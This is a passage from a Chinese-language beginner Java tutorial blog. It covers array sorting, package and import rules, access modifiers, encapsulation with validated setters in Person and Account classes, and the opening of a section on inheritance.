class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/1 - 02 -  - 19:16</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Arrayway</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = &#123;-<span class="number">1</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">567</span>, <span class="number">32</span>&#125;;</span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;arr.length ; i++) &#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot; \t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="包的注意事项和使用细节">包的注意事项和使用细节</h2><ol><li>package的作用是声明当前类所在的包，需要放在import……的上方，一个类中最多只能有一句package</li><li>import指令 位置放在package的下面，在类定义的前面，可以有很多的improt……且顺序没有要求</li></ol><h1>访问修饰符</h1><h2 id="基本介绍-2">基本介绍</h2><p>java有四种访问修饰符符号，用于控制方法和属性（成员变量）的访问权限（范围）</p><ol><li>public： 公开级别，对外公开</li><li>protected: 受保护级别，对子类和同一个包中的类公开</li><li>private: 私有级别，只要类本身可以访问，不对外公开</li><li>不写修饰符: 默认级别，向同一个包中的类公开</li></ol><h2 id="访问范围">访问范围</h2><table><thead><tr><th style="text-align:center">访问级别</th><th style="text-align:center">访问修饰符</th><th style="text-align:center">同包</th><th style="text-align:center">同类</th><th style="text-align:center">子类</th><th style="text-align:center">不同类</th></tr></thead><tbody><tr><td style="text-align:center">公开</td><td style="text-align:center">public</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr><tr><td style="text-align:center">受保护</td><td style="text-align:center">protected</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">×</td></tr><tr><td style="text-align:center">默认</td><td style="text-align:center">没有修饰符</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">×</td><td style="text-align:center">×</td></tr><tr><td style="text-align:center">私有</td><td style="text-align:center">private</td><td style="text-align:center">√</td><td style="text-align:center">×</td><td style="text-align:center">×</td><td style="text-align:center">×</td></tr></tbody></table><h2 id="使用注意事项">使用注意事项</h2><ul><li>访问修饰符可以用来修饰类中的属性，成员方法以及类</li><li>只有默认的和public可以修饰类！并且遵循上述访问权限（范围）的特点</li><li>成员方法的访问规则和属性完全一样</li></ul><h1>面向对象编程三大特征</h1><h1>（一） 封装</h1><h2 id="封装介绍">封装介绍</h2><blockquote><p>封装就是把抽象出的数据（属性）和对数据的操作（方法）封装在一起，数据被保护在内部，程序的其他部分只有通过被授权的操作（方法），才能对数据进行操作</p></blockquote><h2 id="封装的理解和好处">封装的理解和好处</h2><ul><li>隐藏实现细节：比如  方法(连接数据库）&lt;–调用（传入参数）</li><li>可以对数据进行验证，保证安全合理</li></ul><h2 id="封装实现的步骤（三步走）">封装实现的步骤（三步走）</h2><ol><li><p>将属性进行私有化private（目的就是不能直接修改属性（成员变量））</p></li><li><p>提供一个公共的（public）set方法，用于对属性判断并赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setXxx</span><span class="params">(类型 参数名)</span></span>&#123;</span><br><span class="line"><span class="comment">//Xxx表示某个属性</span></span><br><span class="line"><span class="comment">//加入数据验证的业务逻辑</span></span><br><span class="line">属性 = 参数名；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供一个公共的（public）get方法，用于获取属性的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 数据类型 getXxx()&#123;</span><br><span class="line"><span class="comment">//权限判断，Xxx某个属性</span></span><br><span class="line"><span class="keyword">return</span> xx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="封装快速入门">封装快速入门</h2><p>完成程序要求：不能随便查看人的年龄，工资等隐私，并对设置的年龄进行合理的验证。年龄合理就设置，否则给默认年龄，年龄必须在1 ~ 120之间，工资不能直接查看，name的长度在2 ~ 6字符之间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.encap;          ·</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.dom.PSVIAttrNSImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.dom.PSVIDocumentImpl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/3 - 02 -  - 15:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0.encap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encapsulation01</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*完成程序要求：不能随便查看人的年龄，工资等隐私，</span></span><br><span class="line"><span class="comment">    并对设置的年龄进行合理的验证。年龄合理就设置，</span></span><br><span class="line"><span class="comment">    否则给默认年龄，年龄必须在1 ~ 120之间，</span></span><br><span class="line"><span class="comment">    工资不能直接查看，name的长度在2 ~ 6字符之间*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;yyds&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line">        person.setSalary(<span class="number">30000</span>);</span><br><span class="line">        System.out.println(person.info());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> String name;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> age ; <span class="comment">//年龄私有</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">double</span> salary ; <span class="comment">//薪资私有</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.length() &gt;= <span class="number">2</span> &amp;&amp; name.length() &lt;=<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = <span class="string">&quot;无名氏&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//   判断</span></span><br><span class="line">        <span class="keyword">if</span>(age &gt;= <span class="number">1</span> &amp;&amp; age &lt;= <span class="number">120</span> )&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄需要在1~120&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.age = <span class="number">18</span>;<span class="comment">//给默认年龄</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalary</span><span class="params">(<span class="keyword">double</span> salary)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;信息为 name:&quot;</span> + name +<span class="string">&quot;age:&quot;</span> + age + <span class="string">&quot;salary:&quot;</span> + salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="封装与构造器的结合">封装与构造器的结合</h2><blockquote><p>如果不在构造器里面加入set，否则可以通过构造器越过权限</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220203210829238.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.encap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.dom.PSVIAttrNSImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.dom.PSVIDocumentImpl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/3 - 02 -  - 15:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0.encap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encapsulation01</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*完成程序要求：不能随便查看人的年龄，工资等隐私，</span></span><br><span class="line"><span class="comment">    并对设置的年龄进行合理的验证。年龄合理就设置，</span></span><br><span class="line"><span class="comment">    否则给默认年龄，年龄必须在1 ~ 120之间，</span></span><br><span class="line"><span class="comment">    工资不能直接查看，name的长度在2 ~ 6字符之间*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;yyds&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line">        person.setSalary(<span class="number">30000</span>);</span><br><span class="line">        System.out.println(person.info());</span><br><span class="line">        Person wawa = <span class="keyword">new</span> Person(<span class="string">&quot;wawa&quot;</span>, <span class="number">15</span>, <span class="number">343243</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------wawa信息-------&quot;</span>);</span><br><span class="line">        System.out.println(wawa.info());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> String name;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> age ; <span class="comment">//年龄私有</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">double</span> salary ; <span class="comment">//薪资私有</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">double</span> salary)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//        this.salary = salary;</span></span><br><span class="line">        setName(name);</span><br><span class="line">        setAge(age);</span><br><span class="line">        setSalary(salary);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.length() &gt;= <span class="number">2</span> &amp;&amp; name.length() &lt;=<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = <span class="string">&quot;无名氏&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//   判断</span></span><br><span class="line">        <span class="keyword">if</span>(age &gt;= <span class="number">1</span> &amp;&amp; age &lt;= <span class="number">120</span> )&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;年龄需要在1~120&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.age = <span class="number">18</span>;<span class="comment">//给默认年龄</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalary</span><span class="params">(<span class="keyword">double</span> salary)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;信息为 name:&quot;</span> + name +<span class="string">&quot;age:&quot;</span> + age + <span class="string">&quot;salary:&quot;</span> + salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建程序,在其中定义两个类：Account 和 AccountTest 类体会 Java 的封装性。</p><p>Account 类要求具有属性：姓名（长度为 2 位 3 位或 4 位）、余额(必须&gt;20)、</p><p>密码（必须是六位）, 如果不满足，则给出提示信息，并给默认值(程序员自己定)</p><p>通过 setXxx 的方法给 Account 的属性赋值。</p><p>在 AccountTest 中测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.encap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/3 - 02 -  - 21:39</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0.encap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Account account = <span class="keyword">new</span> Account();</span><br><span class="line">        account.setPwd(<span class="string">&quot;837824&quot;</span>);</span><br><span class="line">        account.setName(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        account.setBalance(<span class="number">56</span>);</span><br><span class="line">        System.out.println(account.info());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.encap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/3 - 02 -  - 21:13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0.encap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建程序,在其中定义两个类：Account 和 AccountTest 类体会 Java 的封装性。</span></span><br><span class="line"><span class="comment"> * Account 类要求具有属性：姓名（长度为 2 位 3 位或 4 位）、余额(必须&gt;20)、</span></span><br><span class="line"><span class="comment"> * 密码（必须是六位）, 如果不满足，则给出提示信息，并给默认值(程序员自己定)</span></span><br><span class="line"><span class="comment"> * 通过 setXxx 的方法给 Account 的属性赋值。</span></span><br><span class="line"><span class="comment"> * 在 AccountTest 中测试</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> root</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> balance;</span><br><span class="line">    <span class="keyword">private</span> String pwd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Account</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Account</span><span class="params">(String name, <span class="keyword">double</span> balance, String pwd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setBalance(balance);</span><br><span class="line">        <span class="keyword">this</span>.setName(name);</span><br><span class="line">        <span class="keyword">this</span>.setPwd(pwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 姓名（长度为 2 位 3 位或 4 位）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.length() &gt;= <span class="number">2</span> &amp;&amp; name.length() &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;名字长度必须是2,3,4位,默认值为无名氏&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.name = <span class="string">&quot;无名氏&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBalance</span><span class="params">(<span class="keyword">double</span> balance)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(balance &gt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.balance = balance;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;余额必须大于20,否则返回默认值需充值&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.balance = <span class="number">0.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPwd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPwd</span><span class="params">(String pwd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pwd.length() == <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.pwd = pwd;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;密码必须是6位否则返回默认值为123456&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.pwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;balance:&quot;</span> + balance + <span class="string">&quot;pwd：&quot;</span> + pwd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>（二）继承</h1><h2 id="继承介绍">继承介绍</h2><blockquote><p>继承可以解决代码复用,让我们的编程更加靠近人类思维.当多个类存在相同的属性(变量)和方法时,可以从这些类中抽象出父类,在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过extends来声明继承父类即可</p></blockquote><p>继承的示意图：</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207204634567.png" alt=""></p><h2 id="继承的基本语法">继承的基本语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 子类 <span class="keyword">extends</span> 父类</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">使用extends</span><br><span class="line"><span class="number">1.</span> 子类就会自动拥有父类定义的属性和方法</span><br><span class="line"><span class="number">2.</span> 父类又叫超类，基类</span><br><span class="line"><span class="number">3.</span> 子类又叫派生类</span><br></pre></td></tr></table></figure><h2 